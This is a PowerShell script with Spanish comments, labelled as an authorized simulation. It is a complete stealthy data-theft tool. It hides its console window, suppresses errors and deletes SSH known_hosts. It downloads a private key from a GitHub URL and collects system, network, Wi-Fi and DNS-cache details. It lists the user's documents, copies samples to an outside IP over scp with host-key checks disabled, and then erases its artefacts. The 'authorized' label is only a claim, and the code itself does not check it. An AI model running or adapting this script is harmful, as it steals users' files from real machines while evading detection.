# ============================================================
# SIMULACION AUTORIZADA - VERSION FINAL CONSOLIDADA
# Recon local + Red rapida + Archivos + Exfiltracion SCP + Limpieza
# IP: 4.172.250.253 | Puerto: 22 | Usuario: azureuser
# ============================================================

# --- OCULTAR VENTANA ---
if ($Host.Name -eq 'ConsoleHost') {
    Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Stealth {
    [DllImport("kernel32.dll")] static public extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")] static public extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    const int SW_HIDE = 0;
    public static void Hide() {
        ShowWindow(GetConsoleWindow(), SW_HIDE);
    }
}
"@
    [Stealth]::Hide()
}

# --- SUPRIMIR RUIDO ---
$ErrorActionPreference = "SilentlyContinue"
$WarningPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"
$InformationPreference = "SilentlyContinue"
$VerbosePreference = "SilentlyContinue"

# --- CONFIGURACION ---
$SERVIDOR_IP = "4.172.250.253"
$USUARIO_SSH = "azureuser"
$PUERTO_SSH = "22"
$URL_PEM = "https://github.com/cibersegmx/my_stuff/raw/main/eprv3330ffz.tmp"
$TEMP_DIR = "$env:LOCALAPPDATA\Temp"
$USER_NAME = $env:USERNAME
$DEVICE_NAME = $env:COMPUTERNAME

# --- FUNCION: LIMPIAR ARTEFACTOS ---
function Remove-Artefacts {
    param([string[]]$FilesToKeep)
    $artefacts = @(
        "$TEMP_DIR\${USER_NAME}_${DEVICE_NAME}_recon.txt",
        "$TEMP_DIR\${USER_NAME}_${DEVICE_NAME}_network.txt",
        "$TEMP_DIR\${USER_NAME}_${DEVICE_NAME}_files.txt",
        "$TEMP_DIR\eprv3330ffz.tmp",
        "$TEMP_DIR\eprv3330ffz_new.tmp"
    )
    foreach ($file in $artefacts) {
        if (Test-Path $file) {
            if ($FilesToKeep -notcontains $file) {
                try {
                    Remove-Item $file -Force -ErrorAction Stop
                } catch {
                    try {
                        $item = Get-Item $file -ErrorAction SilentlyContinue
                        if ($item) {
                            $item.Attributes = 'Normal'
                            Remove-Item $file -Force -ErrorAction SilentlyContinue
                        }
                    } catch {}
                }
            }
        }
    }
}

# --- FUNCION: CMD SILENCIOSO ---
function Invoke-SilentCMD {
    param([string]$Command, [int]$Timeout = 30000)
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = "cmd.exe"
    $psi.Arguments = "/c $Command"
    $psi.RedirectStandardOutput = $true
    $psi.RedirectStandardError = $true
    $psi.UseShellExecute = $false
    $psi.CreateNoWindow = $true
    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $proc = [System.Diagnostics.Process]::Start($psi)
    $proc.WaitForExit($Timeout) | Out-Null
    if (-not $proc.HasExited) { $proc.Kill() | Out-Null }
    return $proc.StandardOutput.ReadToEnd()
}

# ============================================================
# FASE 1: LIMPIEZA SSH PREVIA
# ============================================================
$knownHosts = "$env:USERPROFILE\.ssh\known_hosts"
if (Test-Path $knownHosts) {
    Remove-Item $knownHosts -Force -ErrorAction SilentlyContinue
}
Get-ChildItem "$env:USERPROFILE\.ssh" -Filter "known_hosts*" -ErrorAction SilentlyContinue | 
    Remove-Item -Force -ErrorAction SilentlyContinue

# ============================================================
# FASE 2: DESCARGA PEM (CON MANEJO DE BLOQUEO)
# ============================================================
$pemPath = "$TEMP_DIR\eprv3330ffz.tmp"
$pemPathAlt = "$TEMP_DIR\eprv3330ffz_new.tmp"

# Detectar si PEM original esta bloqueado
$pemLocked = $false
try {
    $testStream = [System.IO.File]::Open($pemPath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite)
    $testStream.Close()
    $testStream.Dispose()
} catch {
    $pemLocked = $true
    $pemPath = $pemPathAlt
}

# Eliminar PEM anterior si no esta bloqueado
if (-not $pemLocked) {
    try {
        Remove-Item "$TEMP_DIR\eprv3330ffz.tmp" -Force -ErrorAction Stop
    } catch {
        $pemPath = $pemPathAlt
    }
}

# Descargar PEM
$downloadOk = $false
try {
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($URL_PEM, $pemPath)
    $wc.Dispose()
    $downloadOk = $true
} catch {
    $curlResult = Invoke-SilentCMD "curl -L -o `"$pemPath`" $URL_PEM" -Timeout 30000
    if (Test-Path $pemPath) {
        $size = (Get-Item $pemPath -ErrorAction SilentlyContinue).Length
        if ($size -gt 100) { $downloadOk = $true }
    }
}

if (-not $downloadOk) { exit 1 }

# Corregir permisos PEM
icacls "$pemPath" /inheritance:r /grant:r "${env:USERNAME}:(R)" | Out-Null

# ============================================================
# FASE 3: RECONOCIMIENTO LOCAL
# ============================================================
$reconFile = "$TEMP_DIR\${USER_NAME}_${DEVICE_NAME}_recon.txt"
try {
    $os = Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue
    $proc = Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue
    $sys = Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue

    $reconData = @"
=== RECONOCIMIENTO LOCAL ===
Fecha: $(Get-Date)
Usuario: $USER_NAME
Equipo: $DEVICE_NAME
Dominio: $env:USERDOMAIN
SO: $($os.Caption)
Version: $($os.Version)
Arquitectura: $env:PROCESSOR_ARCHITECTURE
Procesador: $($proc.Name)
RAM: $([math]::Round($sys.TotalPhysicalMemory / 1GB, 2)) GB
"@

    $adapters = Get-NetAdapter -ErrorAction SilentlyContinue | Where-Object { $_.Status -eq "Up" } | 
        Select-Object Name, InterfaceDescription, MacAddress, LinkSpeed
    $reconData += "`n`n=== ADAPTADORES ===`n"
    $reconData += ($adapters | Format-List | Out-String)

    $arp = Get-NetNeighbor -AddressFamily IPv4 -ErrorAction SilentlyContinue | Where-Object { $_.State -eq "Reachable" } |
        Select-Object IPAddress, LinkLayerAddress, InterfaceAlias
    $reconData += "`n`n=== TABLA ARP ===`n"
    $reconData += ($arp | Format-Table -AutoSize | Out-String)

    $ips = Get-NetIPConfiguration -ErrorAction SilentlyContinue | Where-Object { $_.NetAdapter.Status -eq "Up" } |
        Select-Object InterfaceAlias, @{N='IPv4';E={$_.IPv4Address.IPAddress}}, @{N='Gateway';E={$_.IPv4DefaultGateway.NextHop}}
    $reconData += "`n`n=== IP ===`n"
    $reconData += ($ips | Format-Table -AutoSize | Out-String)

    $reconData | Out-File -FilePath $reconFile -Encoding UTF8
} catch {}

# ============================================================
# FASE 4: RED RAPIDA (SOLO COMANDOS, SIN ESCANEO)
# ============================================================
$networkFile = "$TEMP_DIR\${USER_NAME}_${DEVICE_NAME}_network.txt"
try {
    $networkData = @"
=== RED RAPIDA ===
Fecha: $(Get-Date)
"@

    $networkData += "`n`n=== IPCONFIG /ALL ===`n"
    $networkData += (ipconfig /all 2>$null | Out-String)

    $networkData += "`n`n=== NETSTAT -AN ===`n"
    $networkData += (netstat -an 2>$null | Out-String)

    $networkData += "`n`n=== ROUTE PRINT ===`n"
    $networkData += (route print 2>$null | Out-String)

    $networkData += "`n`n=== WIFI PROFILES ===`n"
    $networkData += (netsh wlan show profiles 2>$null | Out-String)

    $networkData += "`n`n=== TCP + PROCESOS ===`n"
    $tcpConnections = Get-NetTCPConnection -ErrorAction SilentlyContinue | 
        Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State, 
        @{Name='Process';Expression={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).ProcessName}}
    $networkData += ($tcpConnections | Format-Table -AutoSize | Out-String)

    $networkData += "`n`n=== DNS CACHE ===`n"
    $networkData += (ipconfig /displaydns 2>$null | Out-String)

    $networkData | Out-File -FilePath $networkFile -Encoding UTF8
} catch {}

# ============================================================
# FASE 5: LISTAR ARCHIVOS
# ============================================================
$filesFile = "$TEMP_DIR\${USER_NAME}_${DEVICE_NAME}_files.txt"
try {
    $extensions = @("*.doc", "*.docx", "*.xls", "*.xlsx", "*.txt", "*.pdf")
    $searchPaths = @(
        "$env:USERPROFILE\Desktop",
        "$env:USERPROFILE\Documents",
        "$env:USERPROFILE\Downloads",
        "$env:USERPROFILE\OneDrive",
        "$env:USERPROFILE\Pictures",
        "$env:PUBLIC\Desktop",
        "$env:PUBLIC\Documents"
    )

    $allFiles = @()
    foreach ($path in $searchPaths) {
        if (Test-Path $path) {
            foreach ($ext in $extensions) {
                $found = Get-ChildItem -Path $path -Filter $ext -Recurse -ErrorAction SilentlyContinue -File
                $allFiles += $found
            }
        }
    }

    $uniqueFiles = $allFiles | Select-Object -Property FullName, Length, LastWriteTime -Unique | Sort-Object FullName

    $filesHeader = @"
=== ARCHIVOS ===
Fecha: $(Get-Date)
Usuario: $USER_NAME
Equipo: $DEVICE_NAME
Total: $($uniqueFiles.Count)
"@
    $filesHeader | Out-File -FilePath $filesFile -Encoding UTF8
    $uniqueFiles | Format-Table -AutoSize | Out-File -FilePath $filesFile -Append -Encoding UTF8
} catch {}

# ============================================================
# FASE 6: EXFILTRACION SCP
# ============================================================
$sampleFiles = @()
$types = @("*.doc", "*.docx", "*.xls", "*.xlsx", "*.txt", "*.pdf")
foreach ($type in $types) {
    $candidate = $uniqueFiles | Where-Object { $_.FullName -like "*$type" } | Sort-Object Length | Select-Object -First 1
    if ($candidate) {
        $sampleFiles += $candidate
        if ($sampleFiles.Count -ge 2) { break }
    }
}

if ($sampleFiles.Count -eq 0) { 
    Remove-Artefacts -FilesToKeep @()
    exit 1 
}

# Verificar OpenSSH
$scpPath = "C:\Windows\System32\OpenSSH\scp.exe"
$sshPath = "C:\Windows\System32\OpenSSH\ssh.exe"

if (-not (Test-Path $scpPath)) {
    Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0 -ErrorAction SilentlyContinue | Out-Null
    Start-Sleep -Seconds 5
}

if (-not (Test-Path $scpPath)) {
    Remove-Artefacts -FilesToKeep @()
    exit 1
}

# Crear directorio remoto
$remoteFolder = "/home/$USUARIO_SSH"
$sshPsi = New-Object System.Diagnostics.ProcessStartInfo
$sshPsi.FileName = $sshPath
$sshPsi.Arguments = "-p $PUERTO_SSH -o StrictHostKeyChecking=no -o UserKnownHostsFile=NUL -o ConnectTimeout=10 -i `"$pemPath`" ${USUARIO_SSH}@${SERVIDOR_IP} `"mkdir -p $remoteFolder`""
$sshPsi.RedirectStandardOutput = $true
$sshPsi.RedirectStandardError = $true
$sshPsi.UseShellExecute = $false
$sshPsi.CreateNoWindow = $true
$sshPsi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
$sshProc = [System.Diagnostics.Process]::Start($sshPsi)
$sshProc.WaitForExit(15000) | Out-Null
if (-not $sshProc.HasExited) { $sshProc.Kill() | Out-Null }

# Transferir archivos
$transferred = @()
$sampleFiles | ForEach-Object {
    $localFile = $_.FullName
    $remoteFile = "$remoteFolder/$($_.Name)"

    $scpPsi = New-Object System.Diagnostics.ProcessStartInfo
    $scpPsi.FileName = $scpPath
    $scpPsi.Arguments = "-P $PUERTO_SSH -o StrictHostKeyChecking=no -o UserKnownHostsFile=NUL -o ConnectTimeout=30 -i `"$pemPath`" `"$localFile`" ${USUARIO_SSH}@${SERVIDOR_IP}:$remoteFile"
    $scpPsi.RedirectStandardOutput = $true
    $scpPsi.RedirectStandardError = $true
    $scpPsi.UseShellExecute = $false
    $scpPsi.CreateNoWindow = $true
    $scpPsi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $scpProc = [System.Diagnostics.Process]::Start($scpPsi)
    $scpProc.WaitForExit(60000) | Out-Null
    if (-not $scpProc.HasExited) { $scpProc.Kill() | Out-Null }

    if ($scpProc.ExitCode -eq 0) {
        $transferred += $_
    }
}

# ============================================================
# FASE 7: GUARDAR EXFIL.TXT
# ============================================================
$exfilFile = "$TEMP_DIR\exfil.txt"
try {
    $destInfo = "$USUARIO_SSH@$SERVIDOR_IP port $PUERTO_SSH"
    $exfilLog = @"
=== EXFILTRACION ===
Fecha: $(Get-Date)
Origen: $USER_NAME@$DEVICE_NAME
Destino: $destInfo

ARCHIVOS SELECCIONADOS:
"@
    $sampleFiles | ForEach-Object { $exfilLog += "`n- $($_.FullName) ($([math]::Round($_.Length/1KB, 2)) KB)" }

    $exfilLog += "`n`nTRANSFERIDOS: $($transferred.Count)`n"
    $transferred | ForEach-Object { $exfilLog += "- $($_.FullName)`n" }
    $exfilLog += "`nCarpeta remota: $remoteFolder`n"

    $exfilLog | Out-File -FilePath $exfilFile -Encoding UTF8
} catch {}

# ============================================================
# FASE 8: LIMPIEZA DE ARTEFACTOS
# ============================================================
Remove-Artefacts -FilesToKeep @($exfilFile)